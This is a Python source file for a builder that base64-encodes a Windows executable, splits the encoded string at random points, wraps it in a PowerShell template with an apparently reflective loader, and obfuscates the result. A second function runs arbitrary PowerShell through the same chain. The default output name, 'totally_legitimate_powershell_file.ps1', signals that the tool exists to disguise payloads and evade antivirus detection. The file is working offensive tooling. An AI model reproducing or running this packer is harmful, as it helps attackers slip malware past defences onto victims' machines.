import base64
import random

import aliases
import comment_remover
import PyFuscation
import files


class Builder:
    def __init__(self, exe_file, output_file="/tmp/totally_legitimate_powershell_file.ps1"):
        self.exe_file = exe_file
        self.output_file = output_file


def base64_exe(exe_file):
    with open(exe_file, "rb") as file:
        based = file.read()
        based = base64.b64encode(based).decode()
    return based


def chop_string(string):
    indices = random.choices(range(1, len(string) - 1), k=8)
    chopped = []
    previous = 0
    for i in sorted(indices):
        chopped.append(string[previous:i])
        previous = i
    chopped.append(string[previous:])
    return "'+'".join(chopped)


def read_file(filename):
    with open(filename, "r") as file:
        return file.read()


def template_file():
    return read_file(files.template_file)


def script_file():
    return read_file(files.reflect_file)

def powershell_template_file():
    return read_file(files.powershell_template_file)

def write_final_file(output_file_content, output_file_name):
    print("writing file to " + output_file_name)
    with open(output_file_name, "w") as file:
        file.write(output_file_content)


def obfuscate(script, use_as_module):
    obfuscator = PyFuscation.Obfuscator(script)
    obfuscator.keep_argument_names_intact = use_as_module
    obfuscator.main()

    if use_as_module:
        function_dictionary = obfuscator.functions
        function_aliases = aliases.add_all_aliases(function_dictionary)
        script = obfuscator.script + "\n".join(function_aliases)
    else:
        script = obfuscator.script
    return script


def build_final_script(exe_file):
    template = template_file()
    payload = base64_exe(exe_file)
    print("chopping up exe " + exe_file)
    payload = chop_string(payload)
    invoke_script = script_file()
    print("adding to powershell script")
    script = template.format(payload, invoke_script)
    script = obfuscate(script, False)
    return script

def pure_powershell_obfuscation(powershell_file, use_as_module):
    template = powershell_template_file()
    powershell = read_file(powershell_file)
    powershell = comment_remover.remove_comments(powershell)
    powershell = obfuscate(powershell, use_as_module)
    based_powershell = base64.b64encode(powershell.encode()).decode()
    print("chopping up powershell " + powershell_file)
    powershell = chop_string(based_powershell)
    powershell = template.format(powershell)
    powershell = obfuscate(powershell, False)
    return powershell

